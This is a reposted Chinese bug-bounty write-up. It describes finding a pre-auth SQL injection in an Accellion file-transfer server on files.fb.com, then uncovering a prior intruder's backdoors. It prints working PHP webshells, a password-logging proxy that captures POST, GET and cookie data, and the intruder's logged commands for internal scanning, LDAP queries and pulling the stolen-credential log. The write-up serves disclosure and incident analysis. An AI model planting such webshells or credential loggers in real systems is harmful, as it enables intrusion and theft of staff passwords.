FROM

```
https://www.cnblogs.com/backlion/p/11103458.html
```



---

# [渗透 Facebook 的思路与发现](https://www.cnblogs.com/backlion/p/11103458.html)

### 0x00 写在故事之前

  身一位渗透测试人员，比起 Client Side 的弱点，我更喜欢 Server Side 的攻击，能够直接控制服务器并获得权限操作 SHELL 才爽 。 当然一次完美的渗透出现任何形式的弱点都不可小视，在实际渗透时偶尔还是需要些 Client Side 弱点组合可以更完美的控制服务器，但是在寻找弱点时我本身还是先偏向于以可直接进入服务器的方式去寻找风险高、能长驱直入的弱点。随著 Facebook 在世界上越来越火、用户数量越来越多，一直以来都有想要尝试渗透目标的想法，恰好 Facebook 在 2012 年开始有了 Bug Bounty 奖金猎人的机制让我更加有兴趣渗透。

   一般如由渗透的角度来说习惯性都会从收集资料、探测开始，首先界定出目标在网路上的 “范围” 有多大，姑且可以评估一下从何处比较有机会下手。例如:

- Google Hacking 能得到什么资料?
- 有几个 B 段的 IP ? C 段的 IP ?
- Whois? Reverse Whois?
- 有什么域名? 内部使用的域名? 接著做子域名的猜测、扫描
- 公司平常爱用什么样技术、设备?
- 在 Github, Pastebin 上是否有泄露的信息?
- …etc

当然 Bug Bounty 并不是让你无限制的攻击，将所遇到的范围与 Bug Bounty 所允许的范围做交集后才是你真正可以去尝试的目标。

一般来说大公司在渗透中比较容易出现的问题点这里例举几个例子来探讨：

1. 对多数大公司而言，”网路边界” 是比较难顾及、容易出现问题的一块，当公司规模越大，同时拥有数千、数万台机器在线，管理员很难顾及到每台机器。在攻防中，防守要防的是一个面，但攻击只需找个一个点就可以突破，所以防守方相对于弱势，攻击者只要找到一台位于网路边界的机器入侵进去就可以开始在内网进行渗透了!
2. 对于 “连网设备” 的安全意识相对薄弱，由于连网设备通常不会提供 SHELL 给管理员做进一步的操作，只能由设备本身所提供的界面设定，所以通常对于设备的防御都是从网路层来防御，但如遇到设备本身的 0-Day 或者是 1-Day 可能连被入侵了都无感应。
3. 人的安全，随著 “社工库” 的崛起，有时可以让一次渗透的流程变得异常简单，从公开资料找出公司员工列表，再从社工库找到可以登入 VPN 的员工密码就可以开始进行内网渗透，尤其当社工库数量越来越多 “量变成质变” 时只要关键人物的密码在社工库中可找到，那企业的安全性就全然被突破 :

在寻找 Facebook 弱点时会以平常的思路进行渗透，在开始搜集资料时除了针对 Facebook 本身域名查询外也对注册邮箱进行 Reverse Whois， 意外发现了个有趣的域名名称

```
tfbnw.net
```

TFBNW 似乎是 “TheFacebook Network” 的缩写 

再由公开资料发现存在下面这台服务器

```
vpn.tfbnw.net
```

哇! vpn.tfbnw.net 看起来是个 Juniper SSL VPN 的登录界面，不过版本是最新你的，并没有直接可利用的弱点，不过这也成为了进入其内部故事的开端。

TFBNW 看似是 Facebook 内部用的域名，来扫扫 vpn.tfbnw.net 同网段会有什么发现

- Mail Server Outlook Web App
- F5 BIGIP SSL VPN
- CISCO ASA SSL VPN
- Oracle E-Business
- MobileIron MDM

从这几台机器大致可以判断这个网段对于 Facebook 来说应该是相对重要的网段，之后一切的故事就从这里开始

------

### 0x01 前期弱点收集

在同网段中，发现一台特别的服务器

```
files.fb.com
```

![img](https://img2018.cnblogs.com/blog/1049983/201906/1049983-20190628162430579-1666662464.png)

​                                             *files.fb.com 登陆界面*

从 LOGO 以及 Footer 判断应该是 Accellion 的 Secure File Transfer (以下简称 FTA)

FTA 为一款安全文档传输的产品，可让让使用者进行线上分享、同步文档，并整合 AD, LDAP, Kerberos 等 Single Sign-on 机制，Enterprise 版本更支持 SSL VPN 服务。

首先看到 FTA 的第一件事是去网络上搜索是否有公开的 Exploit 是否可以被利用，Exploit 最近的是由 HD Moore 发现并发布在 Rapid7 的这篇 Advisory文章

- [Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)](https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857)

弱点中可直接从 “/tws/getStatus” 中泄露的版本信息判断是否可被利用，在发现 files.fb.com 时该版本已从有漏洞的 0.18 升级至 0.20 了，不过就从 Advisory 中所透泄露的代码中感觉 FTA 的编写风格，如果再继续挖掘可能还是会有问题存在的，所以这时的策略便开始往寻找 FTA 产品的 0-Day!

不过从实际黑盒的方式其实找不出什么问题点，只好想办法将方向转为百盒测试，通过各种方式拿到旧版的 FTA 原始代码后终于可以开始研究了!

整个 FTA 产品大致架构

1. 网页端介面主要由 Perl 以及 PHP 构成
2. PHP 原始代码都经过 IonCube 加密
3. 在其项目中跑了许多 Perl 的 Daemon

首先是解密 IonCude 的部分，许多设备为了防止自己的产品被泄露，所以会将原始码加密，不过好在 FTA 上的 IonCude 版本不是最新的，可以使用现成的工具解密，不过由于 PHP 版本的问题，细节部份以及数值运算等可能要靠自己修复一下，不然有点难看…

经过简单的源代码审计后发现，好找的弱点应该都被 Rapid7 找到了T^T 

而需要认证才能触发的漏洞又不怎么好用，只好认真地往深层一点的地方挖掘!

经过几天的认真挖掘，最后总共发现了七个弱点，其中包含了

- Cross-Site Scripting x 3
- Pre-Auth SQL Injection leads to Remote Code Execution
- Known-Secret-Key leads to Remote Code Execution
- Local Privilege Escalation x 2

除了向Facebook 安全团队报告漏洞外，其余的漏洞弱点也编写成Advisory 提交 Accellion 技术文档，经过向厂商提交 修补CERT/CC 后取得四个 CVE 编号

- CVE-2016-2350
- CVE-2016-2351
- CVE-2016-2352
- CVE-2016-2353

详细的弱点细节会在 Full Disclosure Policy 后公布!

![img](https://img2018.cnblogs.com/blog/1049983/201906/1049983-20190628162504732-2102102269.png)

​                      *使用 Pre-Auth SQL Injection 写入 Webshell*

在实际渗透中进入服务器后的第一件事情就是检查当前的环境是否对自己有用，为了要让自己可以在服务器上维持久的权限，就要尽可能的了解服务器上有什么限制、记录，避开可能会被发现的风险 :P

Facebook 大致有以下限制:

1. 防火牆无法连接外部网络, TCP, UDP, 53, 80, 443 皆无法连接
2. 存在远端的 Syslog 服务器
3. 开启Auditd 记录

无法外连看起来有点麻烦，但是 ICMP Tunnel 看似是可行的，但这只是一个 Bug Bounty Program 其实不需要太麻烦就纯粹以 Webshell 操作即可。

------

### 0x02  渗透测试过程

正当收集漏洞证据向 Facebook 安全团队报告时，从网页日志中似乎看到一些奇怪的痕迹。

首先是在 “/var/opt/apache/php_error_log” 中看到一些奇怪的 PHP 错误信息，从错误信息来看似乎像是更改 Code 所执行产生的错误。

![img](https://img2018.cnblogs.com/blog/1049983/201906/1049983-20190628162602484-1915552452.png)

​                                                        *PHP error log*

跟随错误信息的路径分析，发现疑似前人留下的 Webshell 后门

![img](https://img2018.cnblogs.com/blog/1049983/201906/1049983-20190628162636903-846713840.png)

​                          *Webshell on facebook server*

其中几个文件的内容如下：

sshpass

```
沒錯，就是那個 sshpass
```

bN3d10Aw.php

```
<?php echo shell_exec($_GET['c']); ?>
```

uploader.php

```
<?php move_uploaded_file($_FILES["f]["tmp_name"], basename($_FILES["f"]["name"])); ?>
```

d.php

```
<?php include_oncce("/home/seos/courier/remote.inc"); echo decrypt($_GET["c"]); ?>
```

sclient\_user\_class\_standard.inc

[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
<?php
include_once('sclient_user_class_standard.inc.orig');
$fp = fopen("/home/seos/courier/B3dKe9sQaa0L.log", "a"); 
$retries = 0;
$max_retries = 100; 

// 省略...

fwrite($fp, date("Y-m-d H:i:s T") . ";" . $_SERVER["REMOTE_ADDR"] . ";" . $_SERVER["HTTP_USER_AGENT"] . ";POST=" . http_build_query($_POST) . ";GET=" . http_build_query($_GET) . ";COOKIE=" . http_build_query($_COOKIE) . "\n"); 

// 省略...
```

[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)

前几个就是很标准的 PHP 一句话木马 

其中比较特别的是 “sclient_user_class_standard.inc” 这个文件。

include_once 在 “sclient_user_class_standard.inc.orig” 中为原本对密码进行验证的 PHP 程序，骇客做了一个 Proxy ，并在中间进行一些重要操作时先把 GET, POST, COOKIE 的值记录起来。

整理了一下，骇客在密码验证的地方做了一个 Proxy ，并且记录 Facebook 员工的帐号密码，并且将记录到的密码存储到 Web 目录下，骇客每隔一段时间使用 wget 抓取

```
wget https://files.fb.com/courier/B3dKe9sQaa0L.log
```

![img](https://img2018.cnblogs.com/blog/1049983/201906/1049983-20190628162846388-1736411205.png)

​                         *Logged passwords*

从日志记录里面可以看到除了使用者帐号密码外，还有从 FTA 文件时的邮件内容，记录到的帐号密码会定时 Rotate (后文会提及，这点还是XD)

发现最近一次的 Rotate 从 2/1 记录到 2/7 共约 300 条帐号密码纪录，大多都是 “@fb.com” 或是 “@facebook.com” 的员工账号密码，这事觉得事情有点严重了，在 FTA 中，使用者的登入主要有两种模式

1. 一般用户注册，密码 Hash 存在资料库，由 SHA256 + SALT 储存
2. Facebook 员工 (@fb.com) 则走统一认证，使用 LDAP 由 AD 认证

在 这日志记录中有真实的员工帐号密码被泄露，**猜测** 这份帐号密码应该可以通行 Facebook Mail OWA, VPN 等服务做更进一步的渗透…

此外，这名 “骇客” 可能习惯不太好 :P

1. 后门参数皆使用 GET 来传递，在网页日志可以很明显的发现其足迹
2. 骇客在进行一些指令操作时没考虑到 STDERR ，导致网页日志中很多指令的错误信息，从中可以查看到骇客做了哪些操作

从 access.log 可以观察到的每隔数日骇客会将记录到的帐号密码清空

```
192.168.54.13 - - 17955 [Sat, 23 Jan 2016 19:04:10 +0000 | 1453575850] "GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo > /home/seos/courier/B3dKe9sQaa0L.log' 2>/dev/stdout HTTP/1.1" 200 2559 ...
```

打包文件：

```
cat tmp_list3_2 | while read line; do cp /home/filex2/1000/$line files; done 2>/dev/stdout
tar -czvf files.tar.gz files
```

对内部网路结构进行探测

[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview_facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'for i in $(seq 201 1 255); do for j in $(seq 0 1 255); do echo "192.168.$i.$j:`dig +short ptr $j.$i.168.192.in-addr.arpa`"; done; done' 2>/dev/stdout
...
```

[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)

使用 Shell Script 进行内网扫描，但忘记把 STDERR 清理掉XD

![img](https://img2018.cnblogs.com/blog/1049983/201906/1049983-20190628162956658-549199538.png)

 

尝试对内部 LDAP 进行连接

```
sh: -c: line 0: syntax error near unexpected token `('
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w '********' -s base (objectclass=*) 2>/dev/stdout'
```

尝试访问内部网路资源 

( 看起来 Mail OWA 可以直接访问 …)

[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT'

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-' saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.
```

[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)

尝试对 SSL Private Key 渗透

[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)

```
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input
```

[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)

从浏览器观察 files.fb.com 的证书凭证还是 Wildcard 的 *.fb.com …

![img](https://img2018.cnblogs.com/blog/1049983/201906/1049983-20190628163103354-1369941997.png)

------

### 0x03  后记总结

在收集完足够证据后，便立即把它报告给 Facebook 安全团队，报告内容除了漏洞细节外，还附上相对应的 Log 、截图以及时间纪录xD

从服务器中的日志可以发现有两个时间点是明显骇客在操作系统的时间，一个是七月初、另个是九月中旬

七月初的动作从纪录中看起来比较偏向 “寻找” 服务器，但九月中旬的操作就比较恶意了，除了“寻找”外，还放置了密码 Logger 等，至于两个时间点的 “骇客” 是不是同一个人就不得而知了 :P 

而七月发生的时机点正好接近 CVE-2015-2857 Exploit 公布前，究竟是通过 1-Day 还是 0-Day 入侵系统也无从得知了。这件事情就记录到这裡，总体来说这是一个非常有趣的经历xD ，也让我有这个机会可以来写写关于渗透的一些文章 :P

最后也感谢 Bug Bounty 及胸襟宽阔的 Facebook 安全团队 让我可以完整记录这起事件 : )